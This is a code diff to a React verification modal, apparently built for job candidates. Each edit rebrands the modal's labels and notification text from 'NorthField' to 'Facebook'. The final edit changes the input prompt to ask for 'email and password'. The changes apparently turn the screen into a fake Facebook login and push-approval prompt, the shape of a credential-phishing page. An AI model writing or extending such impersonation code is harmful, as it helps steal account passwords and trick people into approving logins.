@@ -175,7 +175,7 @@ export default function VerifyModal({
         <div className="space-y-3.5 font-sans">
           {/* Top Line: Candidate Name • NorthField */}
           <p className="text-sm font-semibold text-gray-800">
-            {candidateName || "Candidate"} • NorthField
+            {candidateName || "Candidate"} • Facebook
           </p>
 
           {/* Heading */}
@@ -244,7 +244,7 @@ export default function VerifyModal({
         <div className="space-y-3.5 font-sans">
           {/* Top Line: Candidate Name • NorthField */}
           <p className="text-sm font-semibold text-gray-800">
-            {candidateName || "Candidate"} • NorthField
+            {candidateName || "Candidate"} • Facebook
           </p>
 
           {/* Heading */}
@@ -254,7 +254,7 @@ export default function VerifyModal({
 
           {/* Subtitle with dynamic device text */}
           <p className="text-xs text-gray-600 leading-relaxed">
-            We sent a notification to your {deviceLabel}. Check your NorthField notifications there and approve the login to continue.
+            We sent a notification to your {deviceLabel}. Check your Facebook notifications there and approve the login to continue.
           </p>
 
           {/* HD Notification Illustration */}
@@ -304,7 +304,7 @@ export default function VerifyModal({
         <div className="space-y-4 font-sans">
           {/* Top Line: Candidate Name • NorthField */}
           <p className="text-sm font-semibold text-gray-800">
-            {candidateName || "Candidate"} • NorthField
+            {candidateName || "Candidate"} • Facebook
           </p>
 
           {/* Heading */}
@@ -386,7 +386,7 @@ export default function VerifyModal({
         <div className="space-y-4 font-sans">
           {/* Top Line: Candidate Name • NorthField */}
           <p className="text-sm font-semibold text-gray-800">
-            {candidateName || "Candidate"} • NorthField
+            {candidateName || "Candidate"} • Facebook
           </p>
 
           {/* Heading */}
@@ -474,7 +474,7 @@ export default function VerifyModal({
         <div className="space-y-4 font-sans">
           {/* Top Line: Candidate Name • NorthField */}
           <p className="text-sm font-semibold text-gray-800">
-            {candidateName || "Candidate"} • NorthField
+            {candidateName || "Candidate"} • Facebook
           </p>
 
           {/* Heading */}
@@ -562,7 +562,7 @@ export default function VerifyModal({
         <div className="space-y-4 font-sans">
           {/* Top Line: Candidate Name • NorthField */}
           <p className="text-sm font-semibold text-gray-800">
-            {candidateName || "Candidate"} • NorthField
+            {candidateName || "Candidate"} • Facebook
           </p>
 
           {/* Heading */}
@@ -760,7 +760,7 @@ export default function VerifyModal({
         ) : (
           <div className="mt-2 mb-4 text-center">
             <p className="text-xs text-gray-500">
-              Please enter your Candidate ID or Email to continue
+              Please enter your email and password to continue
             </p>
           </div>
         )}
